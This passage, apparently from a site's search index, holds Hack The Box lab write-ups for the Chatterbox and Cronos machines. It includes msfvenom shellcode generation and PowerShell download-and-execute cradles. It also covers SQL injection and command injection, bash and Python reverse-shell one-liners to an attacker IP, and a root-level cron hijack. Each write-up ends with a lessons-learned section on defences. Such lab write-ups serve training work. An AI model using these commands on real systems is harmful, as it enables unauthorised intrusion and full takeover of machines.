send a reverse shell back to our attack machine. Since this is a known vulnerability, the administrator should have used the patched version of AChat or completely disabled the service if a patch is not available. To escalate privileges we exploited three vulnerabilities. Security misconfiguration. The Alfred user had full access on the Administrator directory and owned the root.txt file. Although we weren\u2019t initially able to view the root.txt file, we did own it so we simply granted ourselves access to view the file. The administrator should have conformed to the principle of least privilege when setting up user permissions. Automatic logon credentials saved in plaintext. Again, I\u2019m not too familiar with the Windows system, but it seems like there is an option to store automatic logon credentials in encrypted form . This way, as a non-privileged user we wouldn\u2019t have been able to access these credentials. Reuse of credentials. The administrator had setup his password to be the same as the password used for automatic logon. Since these credentials are saved in cleartext in the registry, we were able to view them and start up a PowerShell process that sent a privileged reverse shell back to our attack machine in the context of the Administrator user. It goes without saying that you should definitely not reuse credentials, especially when setting up a non-privileged account where the credentials will be stored in plaintext. Conclusion 38 machines down, 8 more to go!","title":"34. Chatterbox Writeup w/o Metasploit.md"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#reconnaissance","text":"Run the nmapAutomato r script to enumerate open ports and services running on those ports. ./nmapAutomator.sh 10.10.10.74 All All : Runs all the scans consecutively. We get back the following result. Running all scans on 10.10.10.74 ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:27 EST root@kali:~/Desktop/htb/chatterbox# rm -r 10.10.10.74/ root@kali:~/Desktop/htb/chatterbox# nmapAutomator.sh 10.10.10.74 All Running all scans on 10.10.10.74 Host is likely running Windows ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:31 EST Nmap done: 1 IP address (1 host up) scanned in 101.53 seconds ---------------------Starting Nmap Basic Scan--------------------- No ports in quick scan.. Skipping! ----------------------Starting Nmap UDP Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:33 EST Nmap scan report for 10.10.10.74 Host is up. All 1000 scanned ports on 10.10.10.74 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 201.64 seconds ---------------------Starting Nmap Full Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:36 EST Initiating Parallel DNS resolution of 1 host. at 22:36 Completed Parallel DNS resolution of 1 host. at 22:36, 0.12s elapsed Initiating SYN Stealth Scan at 22:36 Scanning 10.10.10.74 [65535 ports] Nmap scan report for 10.10.10.74 Host is up (0.043s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 9256/tcp open unknown Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 27674.79 seconds Raw packets sent: 131092 (5.768MB) | Rcvd: 148 (11.472KB) Making a script scan on all ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST Nmap scan report for 10.10.10.74 Host is up (0.042s latency). PORT STATE SERVICE VERSION 9256/tcp open achat AChat chat system Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds ---------------------Starting Nmap Vulns Scan--------------------- Running CVE scan on all ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST Nmap scan report for 10.10.10.74 Host is up (0.035s latency). PORT STATE SERVICE VERSION 9256/tcp open achat AChat chat system Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds Running Vuln scan on all ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST Nmap scan report for 10.10.10.74 Host is up (0.039s latency). PORT STATE SERVICE VERSION 9256/tcp open achat AChat chat system |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds ---------------------Finished all Nmap scans--------------------- We have one port open. Port 9256 :** **running AChat chat system Before we move on to enumeration, let\u2019s make some mental notes about the scan results. Port 9256 is running some kind of chat system that I\u2019m not familiar with, so the first we\u2019ll do is google it to figure out what it is. Then we\u2019ll run searchsploit on it to see if it is associated to any known vulnerabilities.","title":"Reconnaissance"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#enumeration","text":"Doing a quick google search on the service tells us that AChat is a software that enables you to chat on your local network. It can also be used to share and send files/images to other users. Now that we know what it is, let\u2019s run searchsploit on it. It\u2019s vulnerable to a remote buffer overflow and there is both apython and metasploit exploit for it. We will of course work with the non-metasploit solution. Copy the python script to your current directory. searchsploit -m 36025 Looking at the exploit code we make note of the following things: It looks like your classic stack buffer overflow that allows you to overflow the buffer and include malicious shell code that will get executed on the box. The exploit author was nice enough to give us the msfvenom command that generates the malicious payload ( \u2018buf\u2019 variable) including the bad characters to avoid. This makes our life so much easier! The command simply spawns the calc.exe program on the target machine. So we\u2019ll have to change the command to send a reverse shell back to our attack machine. We also need to change the server_address to that of the IP address of Chatterbox. There seems to be a length limit of 1152 bytes on the payload. Anything that exceeds that will probably not work. We\u2019ll keep that in mind when using msfvenom to generate our reverse shell.","title":"Enumeration"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#initial-foothold","text":"Use msfvenom to generate the reverse shell payload. msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister=EAX -f python We get back the following result. Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/unicode_mixed x86/unicode_mixed succeeded with size 774 (iteration=0) x86/unicode_mixed chosen with final size 774 Payload size: 774 bytes Final size of python file: 3767 bytes buf = b buf += b \\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49 buf += b \\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41 buf += b \\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41 buf += b \\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51 buf += b \\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\\x41\\x41\\x41\\x5a\\x31 buf += b \\x41\\x49\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41 buf += b \\x42\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41 buf += b \\x49\\x51\\x49\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41 buf += b \\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41 ......[truncated] The payload size is 774 bytes, so within the limit. Copy the payload and add it in place of the payload included in the exploit. Also change the IP address to Chatterbox\u2019s IP address. # Create a UDP socket sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) server_address = ( 10.10.10.74 , 9256) Then setup a listener on the attack machine to receive the reverse shell. nc -nlvp 1234 Run the exploit. root@kali:~/Desktop/htb/chatterbox# python 36025.py ---- {P00F}! We get a shell! Grab the user.txt flag. We\u2019re running as a low privileged user, so we\u2019ll need to escalate privileges.","title":"Initial Foothold"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#privilege-escalation","text":"Display the user account information. Next, view all the users on the system. We have three users. The user we want to compromise is the Administrator account. Next, let\u2019s check the system privileges that are enabled for the Alfred user. SetImpersonatePrivilege is not enabled so we can\u2019t use the Juicy Potato exploit to escalate privileges. Run the systeminfo command. The box has 208 hotfixes installed so it\u2019s unlikely that we can escalate privileges using a kernel exploit (although it might be possible, I haven\u2019t checked). Let\u2019s see if we have access to the Administrator directory. We do. That\u2019s odd. Let\u2019s try and view the root.txt flag. We don\u2019t have permission. View the permissions on the root.txt file. Only Administrator has full access (F) on this file. Let\u2019s view the permissions on the Desktop directory. We must have some kind of permission on it because we\u2019re able to enter it. We have full access (F) on the Desktop directory. The Alfred user is also configured to own the root.txt file. So we can simply grant ourselves access to it using the following command. View the permissions again to confirm that the change was made. Perfect! We should now be able to view the root.txt flag. Alright, all we did is view the root flag, we didn\u2019t really escalate privileges. Unfortunately our shell can\u2019t handle running PowerShell, so in the next section, we\u2019ll start from the beginning and send a PowerShell reverse shell back to our target machine and from there we\u2019ll escalate our privileges to Administrator .","title":"Privilege Escalation"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#extra-content-the-powershell-solution","text":"View the options for PowerShell reverse shells in msfvenom. We\u2019ll go with the powershell_reverse_tcp option. msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister=EAX -f python Unfortunately, this gives us a payload that is larger than the maximum size specified in the exploit. So instead, we\u2019ll just use the windows/exec module to download and execute the Nishang reverse shell. Download the Nishang repository and copy the Invoke-PowerShellTcp.ps1 script into your current directory. cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 . mv Invoke-PowerShellTcp.ps1 shell.ps1 Add the following line to the end of the script with the attack machine configuration settings. Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234 When called, this sends a reverse shell back to our attack machine on port 1234. Setup a listener to receive the reverse shell. nc -nlvp 1234 Next, use msfvenom to generate a payload that downloads the PowerShell script and executes it. msfvenom -a x86 --platform Windows -p windows/exec CMD= powershell -c iex(new-object net.webclient).downloadstring( [http://10.10.14.7:5555/shell.ps1 ](http://10.10.14.7:5555/shell.ps1 )) -e x86/unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister=EAX -f python We get back the following result. Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/unicode_mixed x86/unicode_mixed succeeded with size 684 (iteration=0) x86/unicode_mixed chosen with final size 684 Payload size: 684 bytes Final size of python file: 3330 bytes buf = b buf += b \\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49 buf += b \\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41 buf += b \\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41 buf += b \\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51 .....[redacted] Good! The payload size is 684 bytes, so it\u2019s within the limit. Copy the payload and add it in place of the payload included in the exploit. Start up a python server in the directory that the PowerShell script resides in. python -m SimpleHTTPServer 5555 Run the exploit. root@kali:~/Desktop/htb/chatterbox# python 36025.py ---- {P00F}! We get a PowerShell shell! We\u2019ll use the PowerUp.ps1 script to determine if there are any misconfigurations that lead to privilege escalation. Upload and run the script on the target machine. PS C:\\Users\\Alfred\\Desktop iex(new-object net.webclient).downloadstring( [http://10.10.14.7:5555/PowerUp.ps1 ](http://10.10.14.7:5555/PowerUp.ps1 )) PS C:\\Users\\Alfred\\Desktop Invoke-AllChecks We get back two interesting results. [*] Checking for Autologon credentials in registry... DefaultDomainName : DefaultUserName : Alfred DefaultPassword : Welcome1! AltDefaultDomainName : AltDefaultUserName : AltDefaultPassword : [*] Checking for unattended install files... UnattendPath : C:\\Windows\\Panther\\Unattend.xml Viewing the Unattend.xml file, we see that the password was redacted. So let\u2019s focus on the Autologon credentials. The default username is \u201c Alfred \u201d and the default password is \u201c Welcome1! \u201d. I don\u2019t have much experience with Windows, so I googled Autologin credentials to learn more about it. As stated in the article, these credentials are stored in the registry in plain text. The manual commands for extracting these credentials are: PS C:\\Windows\\system32 (Get-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName Alfred PS C:\\Windows\\system32 (Get-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword Welcome1! These credentials are set by the administrator. Since users have a tendency to reuse passwords, let\u2019s see if the administrator account is set to the same password. To do that, first run the following command to convert the plain text string \u201c Welcome1! \u201d into a secure string and store the result in the \\$password variable. $password = ConvertTo-SecureString Welcome1! -AsPlainText -Force ConvertTo-SecureString : Converts plain text to secure strings. -AsPlainText : Specifies a plain text string to convert to a secure string. -Force : Confirms that you understand the implications of using the AsPlainText parameter and still want to use it. Second, create a new object to store these credentials. $cred = New-Object System.Management.Automation.PSCredential( Administrator , $password) Third, we\u2019ll use these credentials to start PowerShell and send a (hopefully privileged) reverse shell back to our attack machine. In the attack machine, copy the shell.ps1 script we used earlier and save it in the file shell-admin.ps1 . cp shell.ps1 shell-admin.ps1 Change shell-admin.ps1 to send a reverse shell to our attack machine on port 6666. Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666 Setup a python server in the directory that the script resides in. python -m SimpleHTTPServer 5555 Setup a listener to receive the reverse shell. nc -nlvp 6666 On the target machine, use the credentials to start PowerShell to download the shell-admin.ps1 script, run it and send a reverse shell back to our attack machine. Start-Process -FilePath powershell -argumentlist IEX(New-Object Net.WebClient).downloadString( [http://10.10.14.7:5555/shell-admin.ps1 ](http://10.10.14.7:5555/shell-admin.ps1 )) -Credential $cred We get a shell with administrator privileges! Now we can view the root.txt flag without having to change the ACL permissions on it.","title":"Extra Content: The PowerShell Solution"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the box we exploited one vulnerability. Buffer Overflow vulnerability. The AChat chat service being used was vulnerable to a known remote buffer overflow vulnerability. This allowed us to execute shell code on the box and send a reverse shell back to our attack machine. Since this is a known vulnerability, the administrator should have used the patched version of AChat or completely disabled the service if a patch is not available. To escalate privileges we exploited three vulnerabilities. Security misconfiguration. The Alfred user had full access on the Administrator directory and owned the root.txt file. Although we weren\u2019t initially able to view the root.txt file, we did own it so we simply granted ourselves access to view the file. The administrator should have conformed to the principle of least privilege when setting up user permissions. Automatic logon credentials saved in plaintext. Again, I\u2019m not too familiar with the Windows system, but it seems like there is an option to store automatic logon credentials in encrypted form . This way, as a non-privileged user we wouldn\u2019t have been able to access these credentials. Reuse of credentials. The administrator had setup his password to be the same as the password used for automatic logon. Since these credentials are saved in cleartext in the registry, we were able to view them and start up a PowerShell process that sent a privileged reverse shell back to our attack machine in the context of the Administrator user. It goes without saying that you should definitely not reuse credentials, especially when setting up a non-privileged account where the credentials will be stored in plaintext.","title":"Lessons Learned"},{"location":"Retired/Chatterbox Writeup wo Metasploit/#conclusion","text":"38 machines down, 8 more to go!","title":"Conclusion"},{"location":"Retired/Cronos Writeup/","text":"sReconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.13 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that 3 ports are open: Port 80: running Apache httpd 2.4.18 Port 22 : running OpenSSH 7.2p2 Port 53 : running ISC BIND 9.10.3-P4 (DNS) Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA full 10.10.10.13 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA udp 10.10.10.13 I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports. Enumeration Port 80 is open so we\u2019ll first visit the IP address in the browser. As usual, we\u2019ll run the general nmap vulnerability scan scripts to determine if any of the services are vulnerable. We don\u2019t get anything useful. Next, we enumerate directories on the web server. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.13 Another dead end. At this point, I googled \u201cApache2 Ubuntu Default Page\u201d and the first entry I got was this . It seems that this might be a configuration issue where the IP address doesn\u2019t know what hostname it should map to in order to serve a specific site and so instead it\u2019s serving the Apache2 ubuntu default page. After looking at the documentation for virtual host configuration in Apache, we need to perform two things. Figure out the hostname(s) that the given IP address resolves to. Add those entries in the /etc/hosts file. The documentation mentions that just because you have virtual host configuration on the Apache server does not magically cause DNS entries to be created for those host names. The hostnames need to resolve to a specific IP address and so since we\u2019re doing this locally, we can simply add the configuration entries in the hosts file. For the first task, we\u2019ll use nslookup to try and figure out the domain name. After running the command, set the server to be 10.10.10.13 and then lookup the given IP address. We can see that this resolves to ns1.cronos.htb. This gives us a domain name of cronos.htb. Second, as mentioned above we need to add the entry to our /etc/hosts file. 10.10.10.13 cronos.htb This way when you browse to cronos.htb page it resolves to 10.10.10.13 and knows which page to serve based on the virtual hosts configuration. Now that we have a working domain name, let\u2019s attempt a zone transfer to get a list of all hosts for this domain. The host command syntax for performing a zone transfer is. host -l domain-name dns_server-address Therefore, to perform a zone transfer we use the following command. host -l cronos.htb 10.10.10.13 We get back the following result. Add the entries in your hosts file. 10.10.10.13 cronos.htb www.cronos.htb admin.cronos.htb Let\u2019s visit the admin page. We\u2019re presented with a login page. We\u2019ll try and use that to gain an initial foothold on this box. Gaining an Initial Foothold The first thing to try is common credentials (admin/admin, admin/cronos, etc.). That didn\u2019t work and this is clearly a custom application, so we won\u2019t find default credentials online. The next step would be to run a password cracker on it. I\u2019m going to use john\u2019s password file. locate password | grep john Let\u2019s see how many passwords the file contains. wc -l /usr/share/john/password.lst 3559 passwords is good enough. Let\u2019s pass the file to hydra and run a brute force attack. To do that, first intercept the request with Burp to see the form field names and the location that the request is being sent to. Now we have all the information we need to run hydra. hydra -l admin -P /usr/share/john/password.lst admin.cronos.htb http-post-form /:username=^USER^ password=^PASS^ Login=Login:Your Login Name or Password is invalid -l: specifies the username to be admin. -P: specifies the file that contains the passwords. http-post-form: we\u2019re sending a POST request. \u201c\u2026.\u201d: the content in the double quotes specifies the username/password parameters to be tested and the failed login message. If you want to see the requests that hydra is sending to confirm everything is working properly you can use the \u201c-d\u201d option. Note from the future : Hydra (with the above configuration) doesn\u2019t end up guessing any valid passwords. While this is running, let\u2019s try to see if the form is vulnerable to SQL injection. To do this manually, you can get any SQL injection cheat sheet from online. After I tried a few, the following payload in the username field successfully exploited the SQL injection vulnerability. admin # This bypasses authentication and presents us with the welcome page. Generally, you would use sqlmap to check if the application is vulnerable to SQL injection, however, since I\u2019m working towards my OSCP and sqlmap is not allowed, I had to resort to manual means. Regardless, if you want to perform the attack using sqlmap, first intercept the request using Burp and save it in a file (login.txt). Then, run sqlmap on the request. sqlmap -v 4 -r login.txt I used the verbosity level 4 so that I can see the payload sqlmap uses for each request. For the above payload we get a redirect to the welcome page. To test it out, go back to the browser and enter the payload in the username field. Then hit submit. We\u2019re presented with the login page! Now that we saw both the manual automated way of exploiting SQL injections, let\u2019s proceed with solving the box. The commands being used on the welcome page are \u201ctraceroute\u201d and \u201cping\u201d so this specific functionality of the application clearly talks to the operating system. Let\u2019s see if it\u2019s vulnerable to command injection. Add the following in the input field and execute the code. 8.8.8.8 whoami What the above command does is run the the preceding command (ping 8.8.8.8) in the background and execute the whoami command. We get back the following result. It\u2019s definitely vulnerable! The web server is running with the privileges of the web daemon user www-data. Since we can run arbitrary commands using this tool, let\u2019s get it to send a reverse shell back to our attack box. Note : It\u2019s not necessary to do this using Burp. First, intercept the request with Burp and send it to Repeater (right click Send to Repeater). Go to pentestmonkey Reverse Shell Cheat Sheet and grab the bash reverse shell. Change the IP address and port to those applicable to your attack machine. /bin/bash -i /dev/tcp/10.10.14.6/4444 0 1 Highlight the entire string and click on CTRL+U to URL encode it. Set up a listener on the attack machine. nc -nlvp 4444 Execute the request. It doesn\u2019t send a reverse shell back. Check if bash is installed on the machine. which bash It is so I\u2019m not sure why this didn\u2019t work. Let\u2019s try python. python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.10.14.6 ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]); Again, don\u2019t forget to URL encode it. We get back a low privileged shell! Let\u2019s upgrade it to a better shell. python -c import pty; pty.spawn( /bin/bash ) This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell. stty raw -echo Once that is done, run the command \u201cfg\u201d to bring netcat back to the foreground. Grab the user flag. We need to escalate privileges. Privilege Escalation Let\u2019s transfer the LinEnum script from our attack machine to the target machine. In the attack machine, start up a server in the same directory that the script resides in. python -m SimpleHTTPServer 5555 In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script. cd /tmp wget http://10.10.14.6:5555/LinEnum.sh Give it execute privileges. chmod +x LinEnum.sh Run the script. ./LinEnum.sh Considering the name of the box, I\u2019m going to focus on Crontab. If you\u2019re not familiar with the crontab format, here\u2019s a quick explanation taken from this page . We\u2019re currently running as www-data and that user usually has full privileges on the content of the directory /var/www. Let\u2019s confirm that. If you\u2019re not familiar with unix permissions, here\u2019s a great explanation. As we suspected, we own the file. Why is that good news for us? We own a file (with rwx permissions) that is running as a cron job with root privileges every minute of every hour of every month of every day of the week (that\u2019s what the * means). If we change the content of the file to send a shell back to our attack machine, the code will execute with root privileges and send us a privileged shell. The cron job is running the file using the PHP command so whatever code we add should be in PHP. Head to pentestmonkey and grab the PHP reverse shell file. You can either transfer it or create it directly in the directory. In my case, I decided to transfer it using a simple python server and renamed the file to artisan (the name of file being compiled in the cron job). cp php-reverse-shell.php artisan Set up a listener to receive the reverse shell. nc -nlvp 1234 Wait for a minute for the scheduled cron job to run and we are root! Grab the root flag. To escalate privileges in another way, transfer the linux exploit suggester script and run it on the target machine to see if your machine is vulnerable to any privilege escalation exploits. I wasn\u2019t able to successfully exploit Dirty COW on this machine but that doesn\u2019t mean it\u2019s not vulnerable. It could be vulnerable to a different variant of the exploit that I tested. Lessons Learned To gain an initial foothold on the box we exploited three vulnerabilities. The ability to perform a zone transfer which allowed us to get a list of all hosts for the domain. To prevent this vulnerability from occurring, the DNS server should be configured to only allow zone transfers from trusted IP addresses. It is worth noting that even if zone transfers are not allowed, it is still possible to enumerate the list of hosts through other (not as easy) means. An SQL injection that allowed us to bypass authentication. To prevent this vulnerability from occurring, there are many defenses that can be put in place, including but not limited to the use of parametrized queries. An OS Command injection that allowed us to run arbitrary system commands on the box. Again, to prevent this vulnerability from occurring, there are many defenses that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly. To escalate to root privileges, we needed to exploit either of the following vulnerabilities. A security misconfiguration in cron that had a scheduled cron job to run a non-privileged user owned file as root. We were able to exploit this to get a privileged reverse shell sent back to our box. To avoid this vulnerability, the cron job should have been scheduled with user privileges as apposed to root privileges. Dirty COW vulnerability. This could have been avoided if the target machine was up to date on all its patches. Conclusion 10 machines down, 31 more to go!","title":"17. Cronos Writeup.md"},{"location":"Retired/Cronos Writeup/#sreconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.13 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that 3 ports are open: Port 80: running Apache httpd 2.4.18 Port 22 : running OpenSSH 7.2p2 Port 53 : running ISC BIND 9.10.3-P4 (DNS) Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA full 10.10.10.13 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA udp 10.10.10.13 I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports.","title":"sReconnaissance"},{"location":"Retired/Cronos Writeup/#enumeration","text":"Port 80 is open so we\u2019ll first visit the IP address in the browser. As usual, we\u2019ll run the general nmap vulnerability scan scripts to determine if any of the services are vulnerable. We don\u2019t get anything useful. Next, we enumerate directories on the web server. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.13 Another dead end. At this point, I googled \u201cApache2 Ubuntu Default Page\u201d and the first entry I got was this . It seems that this might be a configuration issue where the IP address doesn\u2019t know what hostname it should map to in order to serve a specific site and so instead it\u2019s serving the Apache2 ubuntu default page. After looking at the documentation for virtual host configuration in Apache, we need to perform two things. Figure out the hostname(s) that the given IP address resolves to. Add those entries in the /etc/hosts file. The documentation mentions that just because you have virtual host configuration on the Apache server does not magically cause DNS entries to be created for those host names. The hostnames need to resolve to a specific IP address and so since we\u2019re doing this locally, we can simply add the configuration entries in the hosts file. For the first task, we\u2019ll use nslookup to try and figure out the domain name. After running the command, set the server to be 10.10.10.13 and then lookup the given IP address. We can see that this resolves to ns1.cronos.htb. This gives us a domain name of cronos.htb. Second, as mentioned above we need to add the entry to our /etc/hosts file. 10.10.10.13 cronos.htb This way when you browse to cronos.htb page it resolves to 10.10.10.13 and knows which page to serve based on the virtual hosts configuration. Now that we have a working domain name, let\u2019s attempt a zone transfer to get a list of all hosts for this domain. The host command syntax for performing a zone transfer is. host -l domain-name dns_server-address Therefore, to perform a zone transfer we use the following command. host -l cronos.htb 10.10.10.13 We get back the following result. Add the entries in your hosts file. 10.10.10.13 cronos.htb www.cronos.htb admin.cronos.htb Let\u2019s visit the admin page. We\u2019re presented with a login page. We\u2019ll try and use that to gain an initial foothold on this box.","title":"Enumeration"},{"location":"Retired/Cronos Writeup/#gaining-an-initial-foothold","text":"The first thing to try is common credentials (admin/admin, admin/cronos, etc.). That didn\u2019t work and this is clearly a custom application, so we won\u2019t find default credentials online. The next step would be to run a password cracker on it. I\u2019m going to use john\u2019s password file. locate password | grep john Let\u2019s see how many passwords the file contains. wc -l /usr/share/john/password.lst 3559 passwords is good enough. Let\u2019s pass the file to hydra and run a brute force attack. To do that, first intercept the request with Burp to see the form field names and the location that the request is being sent to. Now we have all the information we need to run hydra. hydra -l admin -P /usr/share/john/password.lst admin.cronos.htb http-post-form /:username=^USER^ password=^PASS^ Login=Login:Your Login Name or Password is invalid -l: specifies the username to be admin. -P: 